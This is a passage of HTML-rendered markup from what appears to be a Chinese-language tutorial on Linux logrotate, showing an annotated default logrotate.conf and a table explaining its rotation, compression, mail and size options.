style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n# cat /etc/logrotate.conf\r\n# 底下的设定是 \"logrotate 的默认值\" ，如果別的文件设定了其他的值，\r\n# 就会以其它文件的设定为主\r\nweekly          //默认每一周执行一次rotate轮转工作\r\nrotate 4       //保留多少个日志文件(轮转几次).默认保留四个.就是指定日志文件删除之前轮转的次数，0 指没有备份\r\ncreate         //自动创建新的日志文件，新的日志文件具有和原来的文件相同的权限；因为日志被改名,因此要创建一个新的来继续存储之前的日志\r\ndateext       //这个参数很重要！就是切割后的日志文件以当前日期为格式结尾，如xxx.log-20131216这样,如果注释掉,切割出来是按数字递增,即前面说的 xxx.log-1这种格式\r\ncompress      //是否通过gzip压缩转储以后的日志文件，如xxx.log-20131216.gz ；如果不需要压缩，注释掉就行\r\n\r\ninclude /etc/logrotate.d\r\n# 将 /etc/logrotate.d/ 目录中的所有文件都加载进来\r\n\r\n/var/log/wtmp {                 //仅针对 /var/log/wtmp 所设定的参数\r\nmonthly                    //每月一次切割,取代默认的一周\r\nminsize 1M              //文件大小超过 1M 后才会切割\r\ncreate 0664 root utmp            //指定新建的日志文件权限以及所属用户和组\r\nrotate 1                    //只保留一个日志.\r\n}\r\n# 这个 wtmp 可记录用户登录系统及系统重启的时间\r\n# 因为有 minsize 的参数，因此不见得每个月一定会执行一次喔.要看文件大小。</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b84494575222-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b84494575222-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b84494575222-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b84494575222-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b84494575222-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b84494575222-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b84494575222-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b84494575222-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b84494575222-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b84494575222-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b84494575222-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b84494575222-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b84494575222-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b84494575222-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b84494575222-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b84494575222-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b84494575222-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b84494575222-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b84494575222-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b84494575222-20\">20</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd56e45b84494575222-1\"><span class=\"crayon-p\"># cat /etc/logrotate.conf</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b84494575222-2\"><span class=\"crayon-p\"># 底下的设定是 \"logrotate 的默认值\" ，如果別的文件设定了其他的值，</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45b84494575222-3\"><span class=\"crayon-p\"># 就会以其它文件的设定为主</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b84494575222-4\"><span class=\"crayon-i\">weekly</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-c\">//默认每一周执行一次rotate轮转工作</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45b84494575222-5\"><span class=\"crayon-i\">rotate</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">4</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-c\">//保留多少个日志文件(轮转几次).默认保留四个.就是指定日志文件删除之前轮转的次数，0 指没有备份</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b84494575222-6\"><span class=\"crayon-i\">create</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-c\">//自动创建新的日志文件，新的日志文件具有和原来的文件相同的权限；因为日志被改名,因此要创建一个新的来继续存储之前的日志</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45b84494575222-7\"><span class=\"crayon-i\">dateext</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-c\">//这个参数很重要！就是切割后的日志文件以当前日期为格式结尾，如xxx.log-20131216这样,如果注释掉,切割出来是按数字递增,即前面说的 xxx.log-1这种格式</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b84494575222-8\"><span class=\"crayon-i\">compress</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-c\">//是否通过gzip压缩转储以后的日志文件，如xxx.log-20131216.gz ；如果不需要压缩，注释掉就行</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45b84494575222-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b84494575222-10\"><span class=\"crayon-v\">include</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">logrotate</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">d</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45b84494575222-11\"><span class=\"crayon-p\"># 将 /etc/logrotate.d/ 目录中的所有文件都加载进来</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b84494575222-12\"> </div><div class=\"crayon-line\" id=\"crayon-594bd56e45b84494575222-13\"><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">log</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">wtmp</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-c\">//仅针对 /var/log/wtmp 所设定的参数</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b84494575222-14\"><span class=\"crayon-i\">monthly</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span>  <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span><span class=\"crayon-c\">//每月一次切割,取代默认的一周</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45b84494575222-15\"><span class=\"crayon-i\">minsize</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1M</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-c\">//文件大小超过 1M 后才会切割</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b84494575222-16\"><span class=\"crayon-i\">create</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0664</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">root </span><span class=\"crayon-i\">utmp</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span>  <span class=\"crayon-h\"> </span><span class=\"crayon-c\">//指定新建的日志文件权限以及所属用户和组</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45b84494575222-17\"><span class=\"crayon-i\">rotate</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-c\">//只保留一个日志.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b84494575222-18\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-594bd56e45b84494575222-19\"><span class=\"crayon-p\"># 这个 wtmp 可记录用户登录系统及系统重启的时间</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b84494575222-20\"><span class=\"crayon-p\"># 因为有 minsize 的参数，因此不见得每个月一定会执行一次喔.要看文件大小。</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0030 seconds] -->\r\n<p>由这个文件的设定可以知道/etc/logrotate.d其实就是由/etc/logrotate.conf 所规划出来的目录，虽然可以将所有的配置都写入 /etc/logrotate.conf ，但是这样一来这个文件就实在是太复杂了，尤其是当使用很多的服务在系统上面时， 每个服务都要去修改 /etc/logrotate.conf 的设定也似乎不太合理了。</p>\n<p>所以，如果独立出来一个目录，那么每个要切割日志的服务， 就可以独自成为一个文件，并且放置到 /etc/logrotate.d/ 当中。</p>\n<p>其他重要参数说明：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd56e45b89769277210\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ncompress                                   通过gzip 压缩转储以后的日志\r\nnocompress                                不做gzip压缩处理\r\ncopytruncate                              用于还在打开中的日志文件，把当前日志备份并截断；是先拷贝再清空的方式，拷贝和清空之间有一个时间差，可能会丢失部分日志数据。\r\nnocopytruncate                           备份日志文件不过不截断\r\ncreate mode owner group             轮转时指定创建新文件的属性，如create 0777 nobody nobody\r\nnocreate                                    不建立新的日志文件\r\ndelaycompress                           和compress 一起使用时，转储的日志文件到下一次转储时才压缩\r\nnodelaycompress                        覆盖 delaycompress 选项，转储同时压缩。\r\nmissingok                                 如果日志丢失，不报错继续滚动下一个日志\r\nerrors address                           专储时的错误信息发送到指定的Email 地址\r\nifempty                                    即使日志文件为空文件也做轮转，这个是logrotate的缺省选项。\r\nnotifempty                               当日志文件为空时，不进行轮转\r\nmail address                             把转储的日志文件发送到指定的E-mail 地址\r\nnomail                                     转储时不发送日志文件\r\nolddir directory                         转储后的日志文件放入指定的目录，必须和当前日志文件在同一个文件系统\r\nnoolddir                                   转储后的日志文件和当前日志文件放在同一个目录下\r\nsharedscripts                           运行postrotate脚本，作用是在所有日志都轮转后统一执行一次脚本。如果没有配置这个，那么每个日志轮转后都会执行一次脚本\r\nprerotate                                 在logrotate转储之前需要执行的指令，例如修改文件的属性等动作；必须独立成行\r\npostrotate                               在logrotate转储之后需要执行的指令，例如重新启动 (kill -HUP) 某个服务！必须独立成行\r\ndaily                                       指定转储周期为每天\r\nweekly                                    指定转储周期为每周\r\nmonthly                                  指定转储周期为每月\r\nrotate count                            指定日志文件删除之前转储的次数，0 指没有备份，5 指保留5 个备份\r\ndateext                                  使用当期日期作为命名格式\r\ndateformat .%s                       配合dateext使用，紧跟在下一行出现，定义文件切割后的文件名，必须配合dateext使用，只支持 %Y %m %d %s 这四个参数\r\nsize(或minsize) log-size            当日志文件到达指定的大小时才转储，log-size能指定bytes(缺省)及KB (sizek)或MB(sizem).\r\n\r\n当日志文件 &gt;= log-size 的时候就转储。 以下为合法格式：（其他格式的单位大小写没有试过）\r\nsize = 5 或 size 5 （&gt;= 5 个字节就转储）\r\nsize = 100k 或 size 100k\r\nsize = 100M 或 size 100M</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b89769277210-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b89769277210-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b89769277210-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b89769277210-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b89769277210-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b89769277210-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b89769277210-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b89769277210-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b89769277210-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b89769277210-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b89769277210-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b89769277210-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b89769277210-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b89769277210-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b89769277210-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b89769277210-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b89769277210-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b89769277210-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b89769277210-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b89769277210-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b89769277210-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b89769277210-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b89769277210-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b89769277210-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b89769277210-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b89769277210-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b89769277210-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b89769277210-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b89769277210-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd56e45b89769277210-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-594bd56e45b89769277210-31\">31</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd56e45b89769277210-1\"><span class=\"crayon-i\">compress</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span>通过<span class=\"crayon-i\">gzip</span><span class=\"crayon-h\"> </span>压缩转储以后的日志</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b89769277210-2\"><span class=\"crayon-i\">nocompress</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> 不做<span class=\"crayon-i\">gzip</span>压缩处理</div><div class=\"crayon-line\" id=\"crayon-594bd56e45b89769277210-3\"><span class=\"crayon-i\">copytruncate</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> 用于还在打开中的日志文件，把当前日志备份并截断；是先拷贝再清空的方式，拷贝和清空之间有一个时间差，可能会丢失部分日志数据。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b89769277210-4\"><span class=\"crayon-i\">nocopytruncate</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span>备份日志文件不过不截断</div><div class=\"crayon-line\" id=\"crayon-594bd56e45b89769277210-5\"><span class=\"crayon-e\">create </span><span class=\"crayon-e\">mode </span><span class=\"crayon-e\">owner </span><span class=\"crayon-i\">group</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span>轮转时指定创建新文件的属性，如<span class=\"crayon-i\">create</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0777</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">nobody </span><span class=\"crayon-e\">nobody</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b89769277210-6\"><span class=\"crayon-i\">nocreate</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> 不建立新的日志文件</div><div class=\"crayon-line\" id=\"crayon-594bd56e45b89769277210-7\"><span class=\"crayon-i\">delaycompress</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span>和<span class=\"crayon-i\">compress</span><span class=\"crayon-h\"> </span>一起使用时，转储的日志文件到下一次转储时才压缩</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b89769277210-8\"><span class=\"crayon-i\">nodelaycompress</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> 覆盖<span class=\"crayon-h\"> </span><span class=\"crayon-i\">delaycompress</span><span class=\"crayon-h\"> </span>选项，转储同时压缩。</div><div class=\"crayon-line\" id=\"crayon-594bd56e45b89769277210-9\"><span class=\"crayon-i\">missingok</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span>如果日志丢失，不报错继续滚动下一个日志</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b89769277210-10\"><span class=\"crayon-e\">errors </span><span class=\"crayon-i\">address</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span>专储时的错误信息发送到指定的<span class=\"crayon-i\">Email</span><span class=\"crayon-h\"> </span>地址</div><div class=\"crayon-line\" id=\"crayon-594bd56e45b89769277210-11\"><span class=\"crayon-i\">ifempty</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> 即使日志文件为空文件也做轮转，这个是<span class=\"crayon-i\">logrotate</span>的缺省选项。</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b89769277210-12\"><span class=\"crayon-i\">notifempty</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span>当日志文件为空时，不进行轮转</div><div class=\"crayon-line\" id=\"crayon-594bd56e45b89769277210-13\"><span class=\"crayon-e\">mail </span><span class=\"crayon-i\">address</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span>把转储的日志文件发送到指定的<span class=\"crayon-v\">E</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">mail</span><span class=\"crayon-h\"> </span>地址</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd56e45b89769277210-14\"><span class=\"crayon-i\">nomail</span><span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span> <span class=\"crayon-h\"> </span>转储时不发送日志文件</div><div class=\"crayon-line\" id=\"crayon-594bd56e45b89769277210-15\"><span 